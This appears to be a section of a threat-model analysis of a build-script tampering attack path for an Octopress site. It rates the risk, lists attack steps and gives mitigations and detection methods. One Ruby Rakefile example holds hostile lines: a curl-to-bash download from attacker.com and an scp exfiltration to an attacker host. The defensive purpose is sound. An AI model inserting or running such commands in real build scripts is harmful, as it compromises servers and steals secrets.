### 4. Deep Analysis of Attack Tree Path: Manipulate Build Scripts

**High-Risk Path: Manipulate Build Scripts**

* **Likelihood: Medium** - While gaining direct access to the repository or build environment requires effort, it's a plausible scenario, especially with common vulnerabilities like compromised credentials or insecure CI/CD configurations.
* **Impact: Critical (Modify generated output, compromise server)** - Successful manipulation can lead to significant consequences, ranging from website defacement to complete server takeover.
* **Effort: Low (If access is gained)** - Once access is achieved, modifying text-based build scripts is relatively straightforward, requiring minimal technical expertise.
* **Skill Level: Beginner/Intermediate** - Basic scripting knowledge is sufficient to inject malicious commands into build scripts.
* **Detection Difficulty: Medium** - Detecting subtle modifications within build scripts can be challenging without proper monitoring and integrity checks.

**Attack Steps:**

1. **Modify Rakefile or other build scripts:**

   * **Detailed Analysis:** This step involves the attacker gaining unauthorized access to the source code repository or the build environment. This access could be achieved through various means:
      * **Compromised developer credentials:** Phishing, malware, or weak passwords could allow attackers to access the repository directly.
      * **Insider threat:** A malicious or negligent insider with access to the repository or build environment could intentionally modify the scripts.
      * **Vulnerable CI/CD pipeline:**  Exploiting vulnerabilities in the Continuous Integration/Continuous Deployment (CI/CD) system could grant access to the build environment and its associated files.
      * **Compromised build server:** If the build server itself is compromised, attackers can directly modify the build scripts.
      * **Supply chain attack:**  Compromising dependencies or tools used in the build process could indirectly lead to the modification of build scripts.
   * **Octopress Specifics:** The `Rakefile` is the primary build script in Octopress, defining tasks for generating the static website. Other relevant files could include configuration files (`_config.yml`), Gemfile (for managing Ruby dependencies), and potentially custom scripts used in the build process.

2. **Inject Malicious Commands:**

   * **Detailed Analysis:** Once access is gained, the attacker modifies the build scripts to include malicious commands that will be executed during the build process. These commands can have various objectives:
      * **Website Defacement:** Injecting code to alter the content of the generated website, displaying malicious messages or redirecting users.
      * **Malware Distribution:** Adding scripts to download and execute malware on visitors' browsers.
      * **Server Compromise:** Executing commands on the build server or the deployment server to gain further access, install backdoors, or exfiltrate data. This could involve using tools like `wget`, `curl`, or shell commands to download and execute malicious payloads.
      * **Data Exfiltration:**  Modifying scripts to send sensitive data (e.g., API keys, environment variables) to an attacker-controlled server.
      * **Backdoor Creation:**  Adding scripts to create persistent access mechanisms on the build or deployment server.
      * **Supply Chain Poisoning:**  Injecting code that modifies dependencies or introduces vulnerabilities into the generated website, potentially affecting downstream users.
   * **Examples of Malicious Commands:**
      ```ruby
      # Example in Rakefile
      task :deploy do
        sh 'echo "Malicious script executed!" > public/index.html' # Website defacement
        sh 'curl http://attacker.com/malware.sh | bash' # Download and execute malware on build server
        sh 'scp sensitive_data.txt attacker@attacker.com:/tmp/' # Data exfiltration
      end
      ```

**Why it's High-Risk:**

* **Direct Manipulation:** Modifying build scripts provides a direct and powerful way to influence the final output of the website and the underlying infrastructure.
* **Timing Advantage:** Malicious code injected into build scripts is executed during the automated build process, making it harder to detect compared to runtime attacks.
* **Wide Impact:**  A successful attack can affect all users visiting the website and potentially compromise the server infrastructure.
* **Persistence:**  Malicious modifications in build scripts can persist across multiple deployments if not detected and removed.
* **Trust Exploitation:** Build processes are often trusted and automated, making it less likely for administrators to scrutinize every execution.

**Potential Impacts:**

* **Website Defacement:**  Altering the website's content to display propaganda, malicious messages, or redirect users to phishing sites.
* **Malware Distribution:**  Injecting scripts that deliver malware to website visitors, potentially compromising their devices.
* **Server Compromise:** Gaining unauthorized access to the build server or the deployment server, leading to data breaches, service disruption, or further attacks.
* **Data Breach:**  Stealing sensitive data stored on the server or accessed during the build process (e.g., API keys, database credentials).
* **Supply Chain Attack:**  Introducing vulnerabilities or malicious code into the generated website that could affect its users or other systems that rely on it.
* **Reputational Damage:**  A successful attack can severely damage the reputation and trust associated with the website and its owners.
* **Financial Losses:**  Recovery efforts, legal repercussions, and loss of business due to the attack can result in significant financial losses.

**Mitigation Strategies:**

* **Secure Access Control:**
    * **Strong Authentication:** Enforce strong passwords, multi-factor authentication (MFA) for all accounts with access to the repository and build environment.
    * **Principle of Least Privilege:** Grant only necessary permissions to users and processes.
    * **Regular Access Reviews:** Periodically review and revoke unnecessary access.
* **Code Review and Version Control:**
    * **Mandatory Code Reviews:** Implement a process where all changes to build scripts are reviewed by at least one other developer before being committed.
    * **Version Control System (Git):** Utilize Git to track changes to build scripts, allowing for easy rollback and identification of malicious modifications.
    * **Branching Strategy:** Employ a branching strategy (e.g., Gitflow) to isolate changes and facilitate review.
* **Secure Build Environment:**
    * **Harden Build Servers:** Secure the build servers with appropriate security configurations, including firewalls, intrusion detection systems, and regular security updates.
    * **Isolated Build Environments:**  Use containerization (e.g., Docker) or virtual machines to isolate the build environment from the host system.
    * **Immutable Infrastructure:**  Consider using immutable infrastructure for build environments, where changes are made by replacing the entire environment rather than modifying existing components.
* **Dependency Management:**
    * **Dependency Scanning:** Regularly scan project dependencies for known vulnerabilities using tools like `bundler-audit` (for Ruby).
    * **Dependency Pinning:**  Pin specific versions of dependencies in the `Gemfile.lock` to prevent unexpected updates that could introduce vulnerabilities.
    * **Source Code Integrity:** Verify the integrity of downloaded dependencies using checksums or digital signatures.
* **Build Process Security:**
    * **Input Validation:**  Sanitize and validate any external inputs used in the build process.
    * **Secure Secrets Management:** Avoid storing sensitive information (e.g., API keys, passwords) directly in build scripts. Use secure secrets management solutions (e.g., HashiCorp Vault, environment variables managed by the CI/CD system).
    * **Minimize External Commands:**  Reduce the number of external commands executed during the build process and carefully review the purpose of each command.
* **Continuous Integration/Continuous Deployment (CI/CD) Security:**
    * **Secure CI/CD Configuration:**  Harden the CI/CD pipeline, ensuring secure authentication, authorization, and access control.
    * **Regular Audits of CI/CD Pipelines:**  Review the configuration and permissions of the CI/CD system to identify potential vulnerabilities.
    * **Secure Artifact Storage:**  Secure the storage location for build artifacts.
* **Monitoring and Alerting:**
    * **File Integrity Monitoring (FIM):** Implement FIM tools to detect unauthorized changes to build scripts and other critical files.
    * **Build Process Monitoring:** Monitor the execution of build processes for unusual commands or activities.
    * **Security Information and Event Management (SIEM):**  Integrate build process logs with a SIEM system to detect suspicious patterns.
    * **Alerting on Changes:**  Set up alerts for any modifications to build scripts or unusual activity during the build process.

**Detection Strategies:**

* **File Integrity Monitoring (FIM):**  Tools that monitor changes to files, including build scripts, can alert administrators to unauthorized modifications.
* **Version Control History:** Regularly reviewing the commit history of build scripts in the version control system can reveal suspicious changes.
* **Build Process Logging:**  Analyzing logs generated during the build process can help identify the execution of unexpected or malicious commands.
